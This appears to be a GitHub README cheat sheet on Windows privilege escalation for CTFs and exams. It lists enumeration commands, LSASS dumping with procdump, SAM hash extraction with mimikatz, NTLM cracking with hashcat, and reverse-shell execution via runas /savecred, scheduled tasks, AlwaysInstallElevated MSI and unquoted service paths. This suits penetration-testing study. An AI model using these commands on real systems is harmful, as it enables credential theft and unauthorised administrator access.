# Windows-PrivEsc-full-guide
# ⚠️ UNDER DEVELOPMENT

Hi Everybody! I made this repo to share the privilege escalation techniques I tend to use on Windows based systems. Most of the tools are working perfectly in CTF like competitions/exams. Use them and the tools on your own responsability, if you mess up a coorporative or your own system, that's gonna be your fault and not mine! Now let's get into it.

***

## Enumeration

### basic-enum
```
hostname
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe
```
### user-enum
```
whoami
whoami /priv
whoami /groups
netuser
netuser "USERNAME"
net localgroup
net localgroup "GROUPNAME"
net accounts
```
### network-enum
```
ipconfig
ipconfig /all
arp -a
route print
netstat -a
```
### password-hunting

checks for the word password in all the following file types .txt,.ini,.config
- `findstr /si password *.txt *.ini *.config`

dumps the lsass. process, you can extract lM/NTLM hashes from it with mimikatz
- `C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp`

Selects the last 30 executed powershell command on the system
- `Get-WinEvent -LogName "windows Powershell" | select -First 30| Out-GridView`

### service-enum

checks for all the running services
- `sc queryex type= service`

checks for all the services
- `wmic service list brief`

check is WinDefender (AV) is running
- `sc query windefend`

### firewall-enum
```
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```
## Paths:

### Kernel exploits:

Execute the systeminfo command on the compromised system and save it in a file. Later you can feed this file into automated tools like **windows-exploit-suggester** or **wesng**. Also, you can look up kernel exploits manually on the internet *(google,bing,yahoo,...)*.
For example, you can replace `query` with `MS09-012` below to "search" for MS09-012. Without actually "going to google manually and typing MS09-012".
- https://www.google.com/search?q=query
- https://www.google.com/search?q=MS09-012

If you have a meterpreter shell you can execute the following command to list out all the available kernel exploits:

- `run post/multi/recon/local_exploit_suggester`

Common ones in CTFs are **MS16-014** and **MS09-012**, I saw these popping up multiple times.

### Token impersonation

Tokens are like cookies when accesing to a website. They are assigned to every user upon logging in. The local administrator users got two of these tokens, one with the same priviliges as the a regular user and one with admin priviliges. When the local admin trying to execute a program with admin priviliges a window will pop up warning the user that the program may make changes on the system (UAC).

To make these type of attack work the compromised user must have the SeImpersonatePrivilege enabled, you can check for this with the whoami /priv command. Try the following exploits:


works on older machines better (win7 and older)
- https://github.com/ohpe/juicy-potato

winrm service must be stopped to make this work (default on win10 but not on Windows Server 2019)
- https://github.com/antonioCoco/RogueWinRM


a combination of potato attacks
- https://github.com/CCob/SweetPotato

my go-to for newer systems
- https://github.com/itm4n/PrintSpoofer


If you have a meterpreter shell you can use the a module called incognito with the following commands:

```
load incognito
list_tokens -u
impersonate_token "USERNAME"
```

### Runas

Windows includes a useful command called RunAs that enables a user to run a program as a different user if credentials are known. If a user’s credentials are cached in the system, the Runas command can be run using the /savecred flag which will automatically authenticate and execute the command as that user.

Check for cached credentials using the following command:

- `cmdkey /list`

If you find the cached credentials of an administrator create a reverse shell or download one, transfer it to the machine and execute it with the following command to get admin access:

- `runas /savecred /user:User "Shell to execute"`

e.g: 
- `runas /savecred /user:admin C:\reverse.exe`

Make sure to set up a listener to catch the connection;).

For those who like to use tools for everything I recommend **mimikatz** and **lasagne** for these type of escalation attempts.

### Unattended Windows Installations

Administrators who need to install Windows on multiple hosts can use Windows Deployment Services, enabling them to deploy a single operating system image to several hosts over the network. This type of installation is known as an unattended installation, as it doesn't require user interaction.An administrator account is necessary for performing the initial setup of such installations, which may result in the storage of the account information on the machine in one of the following locations:

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

### Scheduled Tasks

Check for scheduled tasks using schtasks. Use the following commands to retrive more information about the task:

- `schtasks /query /tn $taskname /fo list /v`

For us there are two important parameters when setting up a scheduled task: the "Task to Run" parameter, which specifies what will be executed by the task, and the "Run As User" parameter, which determines the user account that will be used to run the task. If you can overwrite the binary of "Task to run" you can control what's gonna be executed. Check the permissions using icacls.

- `icacls c:\tasks\randomtask.exe`

Rewrite it with a reverse shell of your choice and execute it with the following command or similar:

- `schtasks /run /tn randomtask.exe`

### AlwaysInstallElevated

Installer files for Windows, commonly referred to as .msi files, are utilized to install software applications onto a system. Normally, these files run with the same privilege level as the user who initiated the installation. Nevertheless, it's possible to adjust the configuration to allow them to run with elevated privileges from any user account, __including unprivileged ones__. As a result, it's feasible for a malicious MSI file to be generated that could execute with administrative privileges.

Check for these two registers, both of them must be set to pull of this escalation path:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Create a reverse shell and upload it to the victim machine and use the following command to execute it:

- `msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

### Password hunting

You can query the registries that are containing the word password with the following command:

- `reg query HKLM /f password /t REG_SZ /s`

You can check each registry with the reg query command for more information.

e.g: 
- `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

Pretty time consuming doing it manually, but if nothing works give it a go, otherwise use automated tools for this task.

If you have access, try to copy the SAM and the SYSTEM files to your machine and extract the hashes from them. After the extraction process, try to crack them or use them for pass-the-hash, over-the-hash...etc attacks. pth-winexe is a great utility when you can't crack the hash and want to access to a system.

Both of them can be found in the following path:

**`C:\Windows\System32\config`**

I use mimikatz for dumping the hashes:

Executing mimikatz
- `mimikatz.exe`

The output of everyhing will be saved in **hash.txt** in the *current* directory
- `log hash.txt`

dump out the hashes.
- `lsadump::sam samfile.hiv systemfile.hiv`

You can crack the hashes using hashcat with the -m switch, the value of 1000 corresponds with the NTLM hash type. Make sure to clean the poutput file and only leave the hashes inside.

- `hashcat -m 1000 -a 0 hash.txt usr/share/wordlists/rockyou.txt`

Note: When you see an open servive like apache, mysql or any other make sure to check the config files, logs and backup files for credentials stored in clear text. Sometimes you can find powershell scripts used for automatization (AV update, database checks...etc) with credentials inside as well.


### Services

This is the most complicated one and it involves various attacks. Insecure Service Permissions, Unquoted Service Path, Weak Registry Permissions, Insecure Service Executables.... So, you are in a Windows system and you are looking at services, check if you have access any of the services, if you can restart them, if you can overwrite the binary which is executed when service starts, if you can overwrite the executable where a shortcut points...etc

Look for services you have access and that are running with admin priviliges. Use the following command to list all the services:

- `sc queryex type= service`

There is a Windows utility called accesschk.exe which I use to check what priviliges do I have. The most important one is SERVICE_CHANGE_CONFIG that tells us if we can modify the service.

- `accesschk.exe /accepteula -uwcqv $username$ $service_name$`

Then I use sc query to check if the service is run by system, so we can elevate our priviliges. With sc query look at the value of BINARY_PATH_NAME if it has no quotes and the route has a space in it you can put an executable in one folder above it with the same name and it's gonna be executed first. This is problem of path finding, while using quotes Windows has an absolute path to the executable, if we don't use them Windows are gonna look for the executable folder by folder. I'll leave an example here: 

- `C:\Program Files\Unquoted Path Service\vulnerable.exe`

In this example Windows will look for the vulnerable.exe file in the C folder files, then moves on to Program Files and so on. If we put a reverse shell named vulenarble.exe in the Program Files directory it's gonna be executed before the original binary.

There are a lot of escalation vectors related to Windows services, I suggest that you create a reverse shell and look for shortcuts, places on the hard drive where you can write, services you can modify. If you can modify a service try to overwrite the executable, look for shortcuts, maybe you can overwrite the binary where the shortcut is pointed. Be creative and try harder! ;)

### Scripts for automatization:

- **winPEASany.exe**

- **Seatbelt.exe**

- **PowerUp.ps1**

- **SharpUp.exe**

Personal favorite is *PowerUp.ps1*.

### Links:

https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

https://tryhackme.com/room/windowsprivescarena

https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe/binaries

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
















